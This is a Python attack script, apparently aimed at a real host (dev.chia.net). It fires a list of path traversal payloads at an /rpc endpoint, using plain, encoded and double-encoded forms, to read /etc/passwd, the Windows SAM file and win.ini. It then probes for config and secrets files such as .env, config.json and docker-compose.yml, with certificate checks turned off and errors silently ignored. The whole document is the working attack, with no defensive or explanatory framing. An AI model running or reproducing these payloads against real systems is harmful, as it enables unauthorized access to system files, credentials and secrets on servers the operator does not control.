#!/usr/bin/env python3
import requests
import urllib.parse

print("[*] Chia Path Traversal Exploitation\n")

base = "https://dev.chia.net"

# Common sensitive files to access
files = [
    "/rpc/../../../etc/passwd",
    "/rpc/../../../etc/hosts", 
    "/rpc/..\\..\\..\\windows\\win.ini",
    "/rpc/..%252f..%252f..%252fetc%252fpasswd",
    "/rpc/....//....//....//etc/passwd",
    "/rpc;/../../etc/passwd",
    "/rpc/..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    "/rpc/../../../../../../../../etc/passwd",
    "/.%2e/rpc/../../../etc/passwd",
    "/rpc%2f..%2f..%2f..%2fetc%2fpasswd",
]

print("[*] Testing path traversal for file access:\n")

for path in files:
    try:
        url = base + path
        r = requests.get(url, timeout=5, verify=False)
        
        if r.status_code == 200 and len(r.text) > 20:
            print(f"[✅] {path}")
            print(f"     Status: {r.status_code}")
            print(f"     Content: {r.text[:150]}")
            print()
    except Exception as e:
        pass

# Try to access config files
print("[*] Testing for config file access:\n")

configs = [
    "/rpc/../config",
    "/rpc/../.env",
    "/rpc/../settings.json",
    "/rpc/../config.json",
    "/rpc/../application.properties",
    "/rpc/../docker-compose.yml",
]

for path in configs:
    try:
        r = requests.get(base + path, timeout=5, verify=False)
        if r.status_code == 200 and r.text:
            print(f"[!] {path}: {r.text[:200]}")
    except:
        pass

